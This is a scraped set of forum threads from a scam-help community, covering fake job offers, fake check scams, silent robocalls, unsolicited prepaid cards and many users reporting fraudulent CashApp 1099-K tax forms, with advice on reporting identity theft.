I couldn't complete it since I couldn't put my picture in it. The picture is way below the size they put as a limit, so I started wondering if it is a way to obtain data, they don't ask for anything weird as a bank account, social security number or insurance information, but yet, they have a full name.

Also, I don't remember setting a password, but it has one now, the account got linked through Google. 

Am I overreacting? Has someone actually found a job in this site?

Thanks in advance

- !fakecheck

You are not a bank. When a stranger asks you to play one for them, they are scamming you.
- That's atrocious English and atrocious logic.
- Hijacked .edu addresses are a thing, because of course they are.
- The so-called "job" does not exist. The possibility of one, a thought planted into the targeted victim's mind, is simply the means to an end - the end being the scammer's desire to get the victim to send his own money to the scammer after receiving a fake check which will pay for, in this instance, some donations.

As I have posted here many times before, never be the middleman when it comes to money. That is, receiving money then sending some of it to a third party (which is really the scammer). That screams SCAM!
- Scam, it's good that you saw red flags and listened to your gut feelings.  Online personal assistant is always a scam. This email you got follows a standard script:  they're always busy, out of the country, need you to start today, need you to send money to someone. It's all lies, you're sending money to him or his scammer associates. As other commenters said, it's all a way to steal your money.

Does this alumnus have a name? Is he really a graduate? But it doesn't matter, the scammers are impersonating a real alumnus of your college.

Please report to your college administration, hopefully they can prevent other students from being scammed.
- That check they send you digitally will eventually bounce. You might deposit it and it shows as deposited after a couple days, but it hasn't really cleared yet. Clearing checks can take weeks and weeks. That check is 100% fake and will eventually bounce. Your bank probably also might possibly close your account for depositing a fake electronic check (depositing an emailed check is probably against your terms of service, if not outright illegal where you are).
- Hi /u/seedless0, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

Title: "Hello? Are you there?"
Body: I've gotten 3 calls in the last 20 minutes about people calling and saying nothing. Then sometimes they "hello? are you there?" or "hello can you hear me?". Sometimes they leave no voice message at all. I don't even bother answering anymore which sucks because I run a business, I can't just ignore people's calls all day. They're all from my area code so its essentially impossible to tell until either I call them back or they leave a VM.

Any ideas on how to make these call stop or is everybody pretty much screwed until whatever scam center doing this gets shut down?

- This is probably the first step in a scam. Scammers use robocall systems to automatically dial hundreds of numbers. When you answer, you are added to their list of active phone numbers, for future use.

Here is something that may work: when the phone rings, answer but do not say anything. Wait silently for 30 seconds, then hang up. Another Redditor reports that it has reduced the calls they get (it fools the automated robocall system).

The phone number displayed is probably not their real number, it belongs to some innocent person who knows nothing about the calls. The scammers use technology to spoof the number they're calling from -- so the number displayed on your phone has your area code, or it may even appear to be from your local police; but they are actually calling from across the country, or from somewhere in Asia.
- It seems like a thing, but the "Say Yes and you're recorded" thing has been discredited as an urban rumor. There really haven't been any cases of a recorded voice saying yes being used for scam purposes. However, don't interact with weird phone calls. Just hang up and block. 
https://www.wvtm13.com/article/what-to-know-say-yes-scam/60828926
- Let the voice mail do it's job if you do not recognize the number or they're not in your contacts. 

I once had all zeros, I answered - soooo curious - it was not Hell calling.
- You cannot make scammers stop calling you. But somebody calling you and saying "hello. Are you there?" isn't a scam.
- !wrongnumber
- They are bored ignored them watch a good movie
- Yes, the "hello can you hear me" is one of the phone scams people run. It's usually the same pre-recorded voice too.

From what I've heard from others, the scammers are specifically trying to prompt you to say "yes" and if you do, your "yes" gets recorded and used as a biometric verifier to sign you up for all manner of things, or more directly, authorize payments the real you didn't approve of.

What I do is what another commenter suggested: pick up the phone but don't say anything. Then hang up after 15-30 seconds. 

If you end up inadvertently giving the silent treatment to a real person, you can explain away the awkward beginning of the call by blaming a weak cell signal or something.

Edit: can the downvoters please explain what part of my comment is incorrect, inaccurate, or misleading? Just downvoting without context doesn't really help.
- I'll give this a try, thanks!
- Can confirm, I've been doing this for years and the amount of scam calls I get went from several a week to just a few a year. Whatever system they use is probably marking the number as non working when the line connects but nothing can be heard. That's just my theory.
- Hell would be all sixes üòâ
- Its a robocall and I get 10+ a day, its definitely not a wrong number lol
- Actually, this is often the first step in a scam. See other comments.
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Wrong number scam.

An intentional wrong number text is the entry point to multiple different types of scams. Because these are so prevalent and lead to several unwelcome outcomes (including you confirming you have a live number, leading to more spam/scams), it is recommended that you do not reply to them, even out of courtesy. They hope to take your courtesy, parlay it into a conversation (often by commenting how nice you are and giving some suggestion of fate in meeting this way), and eventually deploy a scam.

If you received a wrong number inquiry that seems to assume a connection with you (e.g. seeking a specific friend, inquiring about a doctor‚Äôs appointment, asking about a business correspondence, etc.) and there are no pictures included, then you are likely at the beginning of a crypto scam. Use ! crypto without the space to get more info on crypto scams. You can see a video of this scam develop from wrong number to crypto scam at https://www.youtube.com/watch?v=CZ_flb9tGuc

If you receive a random text from a woman that is trying to play up a relationship/hook-up angle and includes an alluring photo, you have encountered what this subreddit often calls the Mandy scam, based on the name used in an early incarnation of it. The replies are sent by a bot and will give the same responses (with some slight variations) regardless of how you respond. The bot also has a few specialized responses that occur when you say words like 'bot' or 'scam'. After a series of replies, it will eventually push you to go to an adult/cam/age verification site. Here are some of the posts on r/scams about the Mandy scam: https://www.reddit.com/r/Scams/search?q=mandy&restrict_sr=on&include_over_18=on&sort=relevance&t=all, you can see that the images, names, and scenarios vary. You can report spam texts by forwarding them to 7726 (SPAM): https://www.consumer.ftc.gov/articles/how-recognize-and-report-spam-text-messages

There is also some evidence that intentional wrong number texts can be part of a data-gathering exercise where each bit of info you give (e.g 'Hi Susan!' and you reply with your name out of courtesy) is collected to be used against you in other scams. Thanks to redditor teratical for this script.


**
- You say hi stop calling lol
- I was optimistic.
- It's possible that the number will be verified as active. But since OP runs a business and isn't interested in screening all his calls, based on his post, he does not actually have to worry about a call saying "hello, are you there?"

I have tried to contact them about this, but there is no way for me to speak to a human on the phone.

- Can you write on the envelope, "Addressee Unknown" and stick it back in the mail box? That is what I have been doing to mail that has been addressed to the previous owners of my house.
- Have you noticed anyone driving or walking past your house repeatedly since this started? It's not likely, but it could be that someone is ordering these (assuming they're a type of prepaid card?) using stolen credit cards/compromised accounts, and having them delivered to your place to be picked up by someone else.¬†


If you want to wash your hands of them, you can write 'No Such Person' and drop them into a post office box (Usually you can just stick them back into your mailbox for the postal worker to pick up, but if my first theory is somehow actually correct, you'd be making it easier for someone to pick them up)
- Addresses are public info. Netspend buys information and sends out unsolicited cards. It could be that someone somewhere put your address on a junk website because they didn't want spam. Or maybe someone hoping to intercept the card before it got to you. It doesn't ultimately matter. The best way to get your address removed from their system forever is to use the email address they give out on social media for complaints (social at netspend dot com). You can also email the president (president at netspend dot com). Say you want your address purged and no more promotional materials ever.
- Do people just hoard previous tenants/owners mail? Throw it away who cares
- Yes, I can! I'm just wondering if there's some sort of scam or fraud going on here because it definitely does not belong to the previous owners, as there was only one owner before me and I know her well. Also, each credit card is addressed to a different person.
- Thank you! I will do that!
- Lol it's not previous tenants or owners mail, this house belonged to exactly one person before me.

- That's almost certainly what happened. You entered the full card details in the fake site so they had all the info to make a purchase.

All you can do now is reach out to VISA, there should be a phone number on the card itself, and let them know what happened. They probably won't be able to refund you, after all you gave the card info away, but at least it might help them track the fraud.

Title: Received 1099k form in mail for transactions I did not make.

The form indicates I had 998 payment transactions in September 2024 in the amount of $34,508.30. I've never used CashApp before and have no clue how these transactions could have been made. 

After verifying that the support website provided was legit, I called the support number for CashApp. 

Was my information stolen or is this form fake? If so, any advice on who to reach out to?

Comments:
- For folks saying, "Ignore it," y'all are missing something important.

OP is listed as payee, as in OP received $34,500 in payments.

If the form is legit, CashApp is reporting to the IRS that OP received those payments, meaning the IRS may hold OP liable for taxes on $34,500.

That's not really "Ignore it" territory.

To OP, it sounds like someone may have used your info to open an account and receive payments. Personally, I'd escalate with CashApp support and check out any IRS identity theft info you can find.

I definitely wouldn't ignore it. $34,500 in extra income reported to the IRS is no joke.
- If that is a real (and it looks real) 1099k it also goes to the IRS, and indicates someone has used your tax identification number to receive payments.  Is that TIN yours?

I would not ignore this, the IRS could claim you owe extra tax based on these payments they think you received. I would seek help from the IRS or a tax accountant and not random people on reddit
- Did you use Cash App for crypto transactions?

If this is not yours in any way, do not ignore it. The IRS is receiving a copy and will expect to see it on your tax return.

There is a way to handle it properly.  My professional advice is to file an extension and then file your return in July. This will allow your 2024 Wage and Income Transcript to populate (happens last eeek in May or first week in June). This may not be the only fraudulent tax document. There could be fake W2s or other documents,  so reviewing the Wage and Income Transcript is HIGHLY recommended.  Unfortunately,  you can't do that until they are posted in June.

You can file now, but I wouldn't suggest it. If you do, follow the steps below.

First, see if Block/Cash App will correct it to zeroes. If not, next step. See the link for how to report when receiving a form that you shouldn't have received.

https://www.irs.gov/businesses/what-to-do-with-form-1099-k#shouldnt

Report it, and then back it out with an explanation

Next, file an Identy Theft Affidavit (Form 14039). File it separate from the tax return after you have received your refund. Tax related ID theft cases take an average of 19 months to resolve, and you don't want your refund held up for that period.

Get an Identity Protection PIN for future filings.

https://www.irs.gov/identity-theft-fraud-scams/get-an-identity-protection-pin

Freeze your credit and monitor your bank.

- As people have already mentioned, it's worth it to contact a tax lawyer and the IRS, they may be able to wrestle more information out of Cashapp as well¬†


I'd also add to consider filing a report at IdentityTheft.gov.¬†


This is a pretty scary situation, my question is in a world where name, address, and social don't seem that hard to find, how does someone protect themselves from this situation?
- üôãüèª‚Äç‚ôÇÔ∏è I received a CP2000 letter from the IRS last week saying I didn't report $38k non-employee income from UBER Technologies and that I owed $13k in taxes.  I have NEVER worked for them and don't even have or use the app.  I responded in disagreement, filed a identity theft affidavit to the IRS, got a tax filing PIN, reported to the FTC, checked all credit reports and put a freeze on all bureaus.  IRS suggested contacting the reporting company to fix the problem, but Uber is IMPOSSIBLE to get on the phone for non driver/user issues.  They suck big time and I'm sure it happens a lot bc there have been news articles about it going back 5 years from what I found 

Apparently, people who can't get an SSN or don't want to pay taxes will use others' IDs and get the income and nail the tax on the victim.
- Do you actively use Cashapp? Have you recently looked at your credit report?
- Report the amount on Schedule 1 as other income (line 8z) and then also report the same amount as an adjustment (line 24z) with the entry ‚Äú1099-K issued in error‚Äù.

He has never had CashApp. We looked up the merchant code and found it was for beauty/barbershops? We are doing some google/ Reddit searching and just came across this thread. Thanks to everyone for the suggestions.
- Forgot to mention. Support was not helpful. They just said they "Cannot verify the validity of the statement" and told me to ignore it.
- If this is truly a complete surprise in my opinion it's time to call your Attorney General, especially if you got a "Don't look at us" response from the payer.
- At a minimum, check your SSA account and maybe talk to a service person. Someone has stolen your SSA number and you need to follow up. My experience of the SSA help desk is that they are very good and responsive. You should also follow up with the IRS. 

I think both of those are likely to be more helpful than CashApp  in telling you how to protect yourself. 

I'm just guessing, but I think it's possible that someone stole part of your SSA number. It's not at all uncommon (unfortunately) to give out the last 4 digits along with your name and address. The 1099 form would therefore arrive at your address even if the person used wrong numbers for the rest of the SSA number. 

This could be anything from a scammer and identity thief to someone who is working or selling stuff illegally and needed to supply an SSA number. It's almost 1,000 sales of $34 each. Weird and very worrying.
- Do you have any enemies? My CPA ex-husband once said that if he ever really wanted to fuck with someone, he would send them a big 1099 from a fake company. Then it‚Äôs up to them to prove to the IRS that you never got the money.
- I would suggest first going to a local IRS office, You might have to first schedule an appointment. They should be familiar with issues of identity theft.  Then you might have to contact a tax lawyer
- Did you set up any "merchant processing" for an "employer"?
- I would contact the IRS about this because you are likely experiencing Idenity Theft or something.  My main reason why I use only paypal and never anything else because at least I know its secure.
- This appears to be for a CashApp for Business account. ¬†The merchant category code is 5812 for eating establishments/restaurants. ¬†Honestly they could have been selling anything but this is what they told CashApp they were using the service for. ¬†Agree with others, keep escalating and state that you believe your SSN was used to fraudulently set up a business account and you are in possession of tax forms as proof. Also agree that this means you need to monitor and lock down everything you can: IRS login, credit bureaus, LexisNexis, etc
- I received one of these today and I don't even have Cash app !!!! I don't really even know what it is !!!!
¬† My credit bureau account have been frozen due to other suspicious activity, so that's safe. Biut this infuriates me that I don't even participate in that mess !!!¬†
¬† I'm filing a police report tomorrow !!!¬†
¬†I Googled and found out that there is a lawsuit in progress which the deadline for filing was in Nov. 2024. It specifically states that the fraudulent activity in this thread is the reason for the lawsuit.¬†
¬† No action on their part to acknowledge or investigate the illegal fraud. Much of the same reasons people are asking for advice.
¬† So I'm going to the police tomorrow.
- Same happened to my wife. A credit card from Cash App(she never had an account) showed up in early December. I told me wife to call Cash App and figure out what is going on, she did, Cash App emailed her that they are working on a resolution but never followed up with anything else. Today we received a 1099K from Block Inc for $12,720.81, all of transactions done in December.



Cash App is of no help, they can't find an account for her and hung up when I asked to speak to someone higher up. We filed a report with FTC, CFPB and IdentityTheft.gov. Also will file a report with local police tomorrow.
- I got one today‚Ä¶ called cashapp/square. They said they can only access an account with a username, phone number or email‚Ä¶ so I said ‚Äúwhy would I have that information if someone stole my SSN to make the account‚Äù ‚Äî I mentioned there is an exact account number on the form but they said they cant use that information. Fairly useless if you ask me. Anyone get this addressed yet? What did you end up doing?
- If this is real for sure file an identity theft report. But something that sounds odd to me is that it only lists the last 4 of the ssn. When I've had tax documents they list the full thing.
- I wouldn't call it a scam.  Someone filled out a form with your social and your address on them for their cash app sales.  Can you think of someone who would do that?
- DO NOT IGNORE THIS! You need to verify this directly with the business that issued it. Use a known good number or email to contact the business. If it's cash app then you may have had unauthorized access to your account and it looks like it was used for money laundering.
- There was a class action lawsuit going on a few weeks ago for people affected by this. It was a data breach I believe. I‚Äôm not sure if it‚Äôs still going but it was on classaction.org 

Edit: Just saw you‚Äôve never used Cashapp. Disregard me.
- Read the second paragraph. It says exactly what to do.

TL;DR: [https://cash.app/contact](https://cash.app/contact)
- if the document is legit  
  
call customer care  
open a ticket  
send official mail - use all the mails address you can find on to this subject  


keep everything formal cause this all needs when they need to reverse the transaction

finally please contact legal - you need to open a case as soon as you can, 

and please change all the email passwords / go to more secure 2FA , i mean right now.
- Do they have your TIN correctly? Or had you NEVER had that TIN? 

Their TIN is verified to match with Block Inc (fka Square Inc) . 

Basically, they claimed that you're a registered restaurant, and they processed $$$$$.$$ for you in September 2024 over 998 transactions in the state of Illinois as a credit card processor, all of them are phone or Internet orders (card not present).

Looks legit. And they would have reported this to IRS already. If you ignore it, IRS may audit you.
- I got this in the mail as well. Following.
- I think some used your info to conduct business, so basically fraud. First step is to get in contact with CashApp customer service and see if they can work with you to resolve this. You said they had the correct ssn so it is going to get reported to the IRS. If you are absolutely sure this is not something you did then do not claim it on your return.¬†


A few things are possible from here. Either CashApp fixes the issue and cancels out your reported amount and sends a corrected 1099k to the irs or in a year or two you may get a letter from the IRS about it. If CashApp is able to cancel the reported income, ask them to send you a corrected form that shows $0 that way if they fail to send the updated info to the IRS you will already be able to provide the corrected form.
- !whois cash.app 

Is that their legitimate website?
- We received something similar probably over 5 years ago with our address, and a company name of ‚Äú(our last name) Plumbing Supplies‚Äù. I think it happened two years in a row. We do not own a small business or have any association with plumbing. We contacted the company issuing the 1099k and got nowhere. We reported it to the IRS. I wish I could remember more of the details, but I don‚Äôt. We get a PIN # annually from the IRS to use when we file our taxes due to the report of possible fraudulent activity. We kept the 1099k‚Äôs with our tax records but didn‚Äôt report them. Nothing more ever came of it.
- You need to call cash app directly and ask them about it 

Someone may have been using your name and Social Security number illegally
- I've been through a similar situation and still deal with it every year. Cash app service telling you "don't worry about it" is unacceptable. Here's what I did when I found out that my information was stolen:

I set an appointment with a local IRS office and explained the situation in person. I did everything they told me to do and I obtained relevant receipts from the IRS showing that I visited them and that I filed the appropriate documents with them. 

I set up an IRS Pin so that no one can file a return on my behalf, not even my accountant. By the way, during my visit, I was informed that a return had JUST been filed under my name, not matching any of my actual income. The agent then placed a red flag on my social security number which alerts them to verify anything which comes through under my SS. 

I obtained a copy of all my credit reports to verify all the accounts. I also froze all my credit reports.
- My wife just got one of these to our address with her maiden name.  She hasn‚Äôt gone by that name in 10 years.
- This is happening to me today and it‚Äôs beyond frustrating. A cashapp card came to me in the mail last November. I didn‚Äôt think anything of it. Weird. Then yesterday I got a 1099K from Block Inc and have been on the phone with cashapp all morning. This thread was super helpful! Thank you for sharing your info.
- Everyone that has received this in the mail‚Äî

Get a pin from the irs

Freeze your credit

Go to identiytheft.gov and report report report.
- Same thing happened to me, I just got my fraudulent 1099K from Cash App in the mail today. Panicking, but going to take all the great advice here and contact more people. Thank you thank you thank you.
- u/ras1187 Same thing happened to me!! I've been thrown through the loop with Cash App with random agents that sound like bots! They have not been helpful and the "investigation" they did was a joke!! Did you get any positive response from them to try to zero out your 1099k?
- My husband got one as well for $8k. Not sure what, he didn't receive any money via cashapp, or any other app
- Commenting here just to follow as well as I got one yesterday.
- I just got the same thing for transactions in June and July. Hope Cashapp takes this more seriously...will be reaching out to them and takin any corrective actions I have to take with IRS. Good luck OP and let us know what works for you or doesn't.
- I also received 2 of these 1099k‚Äôs for some fraudulent accounts. I have credit monitoring and frozen credit, and even froze my info with the Chex System l.didn‚Äôt do shit. 

Called cashapp twice when this occurred to close both accounts &  to file a fraud investigation and they never did. Closed both of my requests without doing shit.

I went the CFPB route today since i didn‚Äôt see this thread. Submitted a report since they supposedly contact Block directly and guarantee a response from the company within 15 days.

there was a judgement against Block Inc January 16th for their shit support and shady business practices. Go figure.

https://www.consumerfinance.gov/about-us/newsroom/cfpb-orders-operator-of-cash-app-to-pay-175-million-and-fix-its-failures-on-fraud/
- Just got ours in the mail. So we got scammed too. What a mess.

Edit:

Ok, get this. Cash app can ONLY look up accounts by phone number, email or their cashapp username. They CANNOT look up your account with the account number that this document provides or with your social! So there is no way for them to correct these 1099s or even find the fraudulent account when you contact them! Absolutely shameful and has to be illegal. They let people open accounts with your identifying information and then have no way of tracking down the offending accounts because clearly you wouldnt have the scammers phone or email they used to open the account!
- Got the same form yesterday, I've taken all the steps, just need to file a police report just so I have one.
- I just received the same thing in the mail yesterday. I called CashApp, and they are looking into it. Do you have any updates from CashApp?
- Just here to commiserate. Received one today almost identical to OP‚Äôs, except mine was 456 transactions in the month of December, and my merchant code was for advertising services. I have Cash App but have only ever used it a handful of times. 

When I logged in to the app, there was a pop up that my account has been closed for violating their terms and conditions by gambling. I‚Äôve sent a few bucks to friends for pizza or to chip in for something at work. Never gambling nor running a business. The only transactions I see in my history are the few I‚Äôve actually made. 

I used the chat functionality but that was useless. I was told they can‚Äôt give tax advice (not what I was asking for), nor can they pinpoint what specifically I violated. They created a case to escalate it, but I think that is only for the closure and not the fraud. I‚Äôll try calling tomorrow, but I don‚Äôt actually expect anything to be resolved. 

Count me in for a class action lawsuit, though. üòÇ
- Just wanting to add I recently got this form too (same filer‚Äôs TIN), and the merchant code listed is 5462 (I had to Google and I believe it‚Äôs for bakeries). Says I had 556 transactions in Nov ($933.56) and Dec ($8,835.20).

I am not an independent contractor/employee/business owner, and hadn‚Äôt used CashApp in years (in fact I thought I closed it), but when I attempted to login to the app, it also said it was closed due to gambling?!

Anyways, just echoing everyone‚Äôs sentiments and will plan to contact CashApp, the IRS, and Social Security, per the recommendations from earlier comments. 

Also it sounds like people are also recommending making a police report?
- https://youtu.be/YiQ09sB-35g?si=A-TRVts06F9iy43u

Cash app seems to be dealing with fraud from every angle.
- [removed]
- I'm so sorry this is happening to you; it's a nightmare. I'm also a non-Cash App user and just received a 1099-K for $5,496.70, all for December 2024. The merchant code is 8299 for "schools and educational services that are not classified elsewhere." I have gotten absolutely nowhere with Cash App support, and all I've really been asking is that they close the account associated with my information. If anyone has suggestions on how to deal with Cash App, please share.

I completed an FTC report and it looks like they may be able to step in if Cash App will not provide the action and/or information the FTC requests, so fingers crossed. 

[https://www.irs.gov/pub/irs-pdf/p5027.pdf](https://www.irs.gov/pub/irs-pdf/p5027.pdf)¬†has been helpful and I'm completing these steps today. I'll also be using a CPA to help with taxes this year to ensure I can file on time and correctly in spite of this.

Does anyone know what steps are with the Social Security Administration? I want to know if I have to file for a new SSN, particularly because of how support with Cash App is going--I don't want to deal with this again next year.

KEEP RECORDS OF ALL COMMUNICATIONS WITH CASH APP. I transitioned from phone to email, so I have at least one person's name, an email address, and timestamps.
- CashApp says their phone support cannot help you but they CLAIM that if you create an account, you can use the in app support to close the fraudulent account at least. Going to try that later. As soon as they answered me the rep goes 'did you receive a 1099?' so they are aware that something new and big is happening.

Edit:

The support team in the app is also unwilling to take action. Terrible.
- We also received a 1099 from this company 2 days ago. Called the company asking for the access information that this money actually went into (since we know it‚Äôs not ours) they said only law enforcement could request that.  My friend is a Sheriff , so we opened a case just to have some documentation started.  Their investigations team requested this information and now we are being told they need a subpoena, which can take weeks and weeks.  I also have a close relative who works for a government agency, the kind with three letters.. you get it.  This family member can‚Äôt get the information either without a subpoena. 
While our 1099 wasn‚Äôt for as much as what yours is stating, I think all of us are concerned about what can happen down the line as far as identity theft etc. 
Ours had 382 transactions all in the month of December.  That‚Äôs CRAZY!  
We are locking our credit. Other than that, and placing higher security standards on our banking and debit/credit cards‚Ä¶ I‚Äôm feeling kinda lost. 
This is clearly a scam.  Our local law enforcement as well as my family member are saying it‚Äôs the weirdest scam they have seen.  Usually scams involve losing money.  Not being asked to pay taxes on money you ‚Äúsupposedly‚Äù earned.
- Also got this same 1099-K 2 days ago for 260 transaction in November!! I contacted Block, Inc first and they advised me to contact Cash App. Cash App was able to route my call to their fraud department and a case has been started. This was what they sent me via email in which I did all they suggested. 

Our team has received your claim regarding the 1099 tax document issued to you.¬†  
  
Cash App does not provide tax advice. If you have further questions about your particular tax situation you should reach out to your tax advisor.¬†  
  
If you believe your personal information is being used, we recommend visiting [IdentityTheft.gov](http://IdentityTheft.gov) ([https://www.identitytheft.gov/](https://www.identitytheft.gov/)) where they can help you report and recover from identity theft.  
  
If you would like to further pursue this claim, you may wish to contact local law enforcement. Cash App will cooperate with any active investigation and provide any supporting documentation that may assist with their investigation in the matter.

In the meantime, I'm asking Block to correct the 1099K to show "0" amount and waiting to hear back.
- Hey, just wanted to say that I got a 1099-K like this from Cash App today as well. I suspect more people will be reporting this over the coming weeks. Appreciate all the advice that users have offered in this thread, I've frozen all of my credit reporting and filed identity fraud reports with the relevant agencies (FTC, SSA, IRS).
- I got one for almost $5,000 and I‚Äôve only paid for my son‚Äôs $30 haircuts on there.
- https://preview.redd.it/q52buv6frtee1.jpeg?width=1170&format=pjpg&auto=webp&s=f1d0bc30445beddf260b605a7fba515f7f834453

I got one too and it‚Äôs definitely not legit. I only paid for my sons haircuts on cashapp
- I just had 2022 IRS audit and Block in reported they paid me $23,156 which is false.  I filed a fraud report with IRS and FBI fraud division.  If you Google Consumer Financial Protection Bureau you will see that they just won a judgment with Block Inc fka Square and owner of Cash App for $175M, they have to repay consumers $120M and find $55M to Consumer Financial Protection Bureau due to the company's lax compliance.  We are not consumers in this situation.  We are clients of Block Inc fka Square and owner of Cash App.  I filed a complaint with Consumer Financial Protection Bureau (CFPB) which was tricky bc I tried to explain to them that I am 'client' of Block Inc (etc.) and how can their Bureau protect the number of clients of Block, Inc etc.  They took my claim and sent my complaint to Block Inc for response.  If we all file claims, I'm hoping Block will be taken to task for not only treating customers wrong, but we the client.  I've read many people saying why did Block Inc send a 1099 for more than what their records show.  Plus clients like me that has no open account, no website to review transactions, Never had Cash App.  I also sent a letter to Block Inc along with copy to IRS and FBI Fraud division, but they have not responded.   I also read on google a news agency report on 5/1/2024 they were being investigated for money laundering and something to do with crypto.  I'm 73, retired and care for my husband 24/7 since 12/25/2020 when he had 6 strokes while ventilated for Covid; has permanent vision impairment, vascular dementia, impulse control and aphasia issues.  Oh, I also filed a report with the FTC Federal Trade Commission because they audit financial institutions because they have to have compliance dept., which Block Inc wasn't using properly.  NOT identity theft.
- Outside of trying to get in touch with Cash App, I want to confirm the steps we are all taking to a) make sure I haven't missed anything important, and b) get it all down in one post for anyone new.

My situation is just like OP's: I received this document and have never created a Cash App account or utilized any of Block, Inc.'s services.

**I've Completed:**

1. Filed a report with the Federal Trade Commission (FTC).
2. Filed a report with the Consumer Financial Protection Bureau (CFPB).
3. Filed a 14039 IRS form.
4. Filed a report with local law enforcement. (The officer informed me he'd already taken a report for the exact same thing earlier in the day.)
5. Filed a fraud alert with one of the three major credit bureaus, who then notify the other two.
6. Frozen my credit. (I did this with just one, but it may be something we have to do with all three.)
7. Generated PIN w/ IRS

**Some Extra Protection Steps I've Taken:**

1. Contacted my bank to see what their fraud alert policies, etc. were.
2. Contacted my cell phone provider to see what their policies were if someone claiming to be me contacted them to change the SIM, etc.

**Outstanding Steps & Questions:**

1. Does the Social Security Administration (SSA) do anything or just direct you to the FTC?
2. I am trying to find a tax professional to meet with me to discuss how to correctly file taxes this year in spite of this.
3. Did anyone who filed a 14309 IRS form get a case or confirmation number?
4. I see someone suggested reaching out to a CA House Rep. Has anyone done this or thinking of doing this with your own state's reps?
5. Are there any other suggestions out there?

This entire group has been so incredibly helpful and supportive. Thank you!

NOTE: I don't know whether this form is fake or not, and without Cash App support we can't verify whether the FILER TIN is accurate. There is nothing outside of the quality of the paper that makes me confident it's fake, so I'm operating under the assumption it's a legit 1099-K and that someone used my information to create a Cash App account so that I would have to pay taxes on their earnings.
- I am a recent widow and am also in the process of buying a new house. So this BS hits me hard. I received two 1099s - a November$1855 and a December 4359.25.  I went to my local police department, and I had to fill out a form and bring it back. I called cash app twice and they were no help. I am beyond frustrated.
- This is not CashApp. It's from Square, which is owned by PayPal. It's a POS equipment.
- Did a family member come into some money in september 2024? Did you have an event then?
- Just wanted to let you know it‚Äôs a scam. Completely. First you can tell by the thin paper it‚Äôs on and how fake the whole document looks. My biggest ah ha moment was me and the op‚Äôs TIN number are exactly the same. Rookie mistake for the scammers. I‚Äôve been dealing with identity theft for years. Credits been frozen. And I have a personal pin to file taxes. Cause I‚Äôm sure there‚Äôs a lot of people that file in my name.
- Thank you. This was in my mind when they told me not to worry about it the first call. I called again and they are conducting an investigation now
- I had this when Sumitomo Bank (who I never even knew why they were) said I earned $20k interest.  I called the bank and said I wanted to close my account and have the money.  They refused to look me up by SSN and had no record of my name. 

The IRS said "just file as if you never earned it".  I did.  I never heard another word.

My theory is the IRS would question me or the bank if they saw an error.  Never happened to me.
- I agree. With 998 payments, there has to be a long paper trail on this. Get a list of all these transactions.
- [deleted]
- The IRS just wants their money with penalties and interest.  You have to prove to them (which I've been trying to do since last September.  It's not identity theft in my case anyway.  It's Block Inc sending many of their clients 1099's for more money than what their own records show.  I truly believe it's because of them being investigated for money laundering/crypto.  They are using me (their clients) to hide paying their own profits to IRS.
- Wow. A 1099 form is for independent contractors earnings. Some scammer can be using their Social Security # or tax identification number for their forms.


Unless you can disprove it was you, IRS might go after the taxes for those earnings.


1099 workers do not have taxes taken out and are responsible to file & pay quarterly on federal and state income taxes.


They are supposed to do their own bookkeeping and track earnings to pay taxes.


The category code is eating and dining places.


Maybe you got caught up in that Uber Eats "hack?"
- I hope OP sees your comment, because it's clear, informative and extremely helpful. But until they see it, I wanted you to know that your comment has been seen and appreciated, and that you're being very kind, sharing your expertise here.
- Hi, thank you very much for your comment. Everyone here has been extremely helpful but your comment stands out for me. I have never used CashApp at all for crypto or anything else. 

I have done the following today:

1.) Called CashApp again and insisted that fraudulent activity has occurred. They are now assigning me a case number and conducting an investigation.

2.) Enrolled in pin program with the IRS

3.) Filed a claim with SSA detailing my situation

4.) Filed a claim with IdentityTheft.gov

I will take your advice and file for an extension and wait to see the Wage Income Transcript in June. 

I have checked my bank accounts, credit cards and everything seems normal. Are there any additional steps you would recommend for protection? Thank you very much for all your help so far.
- Thank you so much for this response! I got an almost identical 1099K today and have never even used cash app. This is very informative
- One thing to add.  If you do,file for an extension make sure you pay any taxes you would otherwise owe by the April 15 deadline, otherwise the IRS will charge you interest.
- I agree this should be taken seriously and is good advice. My wife received the same thing. When she contacted Cash App, they told her that all their 1099s are sent via email and that if it was received in the mail it was not from them.

IF that is accurate, it would indicate this may be some sort of phishing/other scam rather than actual transactions and that a 1099 wouldn't be sent to the IRS.

Again, not telling people not to protect yourselves and take some of the precautionary steps others have suggested. But I hadn't seen it mentioned here that the 1099 itself likely may be fake.
- By being vigilant and checking you credit reports, SSA account, and all your financial accounts on a regular basis and immediately addressing any discrepancies or strange things found therein.
- I contacted a tax attorney who also had worked for the IRS and shared my info.  He said there was nothing he could do in this fraud situation.  He said I was doing all the right things already.
- Oh wow, that's awful. Were you able to get any help from anyone at all?
- Just in case it's not identity theft.  File a claim with Consumer Financial Protection Bureau.  They just won a judgement for Block Inc./Square for $175M plus, plus, plus.
- Have never used CashApp before. I get a regular credit report with my CC statements and have not noticed anything irregular there
- You don't sound like a tax pro. You sound like a hack. You skipped everything on that page about steps to take BEFORE just giving up and reporting the income as issued in error.

Typical "Not my problem" response that will just cause more problems than it will solve.
- I also received an almost identical form! Thank goodness for Reddit I feel less alone in this!! I wonder if the account numbers are the same on the bottom left? All my transactions are in September and October as well. Just like OP I have never used cash app or square!
- I received the same form from cash app as well. Never used cash app. My merchant code is used for membership clubs. All 669 transactions of mine happened in november and december. I called cash app and they told me to report an identity theft
